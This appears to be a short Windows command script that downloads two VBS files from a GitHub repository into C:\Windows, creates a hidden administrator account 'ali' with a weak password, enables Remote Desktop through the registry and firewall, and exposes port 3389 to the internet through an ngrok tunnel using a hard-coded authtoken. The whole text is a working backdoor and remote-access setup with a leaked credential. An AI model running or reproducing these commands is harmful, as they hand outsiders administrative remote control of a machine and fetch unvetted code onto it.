curl.exe https://raw.githubusercontent.com/terionun/gui/main/test.vbs -o C:\Windows\test.vbs
curl.exe https://raw.githubusercontent.com/terionun/gui/main/test2.vbs -o C:\Windows\test2.vbs



net user ali ali123 /add
net localgroup administrators ali /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
C:\Windows\ngrok.exe config add-authtoken 1d0A6StSywuFgvJKSRCPurcS63o_2uL5cX6HAHfJz7rFzfJTq
C:\Windows\ngrok.exe tcp 3389



